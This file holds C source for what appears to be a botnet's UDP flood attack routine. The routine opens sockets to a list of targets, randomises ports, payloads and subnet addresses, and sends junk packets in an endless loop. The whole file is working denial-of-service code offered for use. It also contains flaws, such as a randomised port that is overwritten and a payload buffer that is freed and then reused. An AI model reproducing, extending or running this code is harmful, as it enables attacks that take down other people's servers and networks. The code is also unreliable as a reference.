#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>

#include "../../attack.h"

void flood_udpplain(struct flood *flood)
{
    struct sockaddr_in bind_addr = {0};

    int i = 0;
    int *fd = calloc(flood->num_of_targets, sizeof(int));

    // Randomize source port
    if (flood->settings->source_port == 0xffff)
        flood->settings->source_port = rand_next();

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct flood_target target = flood->targets[i];

        struct iphdr *ip_header;
        struct udphdr *udp_header;

        // Randomize destination port
        if (flood->settings->dest_port == 0xffff)
            target.sock_addr.sin_port = rand_next();

        target.sock_addr.sin_port = htons(flood->settings->dest_port);

        // Create datagram socket.
        if ((fd[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
            return;

        // Bind a local server for the source port.
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = flood->settings->source_port;
        bind_addr.sin_addr.s_addr = 0;
        bind(fd[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));

        // Randomize destination address if the netmask is below 32 to add subnet support.
        if (target.netmask < 32)
            target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

        // Connect to the UDP socket
        int x;
        for (x = 0; x < flood->settings->repeat; x++)
        {
            connect(fd[i], (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));
            usleep(flood->settings->csleep * 1000);
        }

        if (!flood->settings->random_data && flood->settings->payload == NULL)
        {
            flood->settings->payload = (char *)malloc(flood->settings->length);
            rand_str(flood->settings->payload, flood->settings->length);
        }
    }

    // Start sending traffic.
    while (1)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            struct flood_target target = flood->targets[i];

            // Randomize destination address if the netmask is below 32 to add subnet support.
            if (target.netmask < 32)
                target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            // Randomize payload when data randomization is turned on.
            if (flood->settings->random_data)
            {
                if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                    flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                flood->settings->payload = (char *)malloc(flood->settings->length);
                rand_str(flood->settings->payload, flood->settings->length);
            }

            send(fd[i], flood->settings->payload, flood->settings->length, MSG_NOSIGNAL);

            if (flood->settings->payload != NULL && _strlen(flood->settings->payload) > 0)
            {
                free(flood->settings->payload);
            }
        }
    }
}
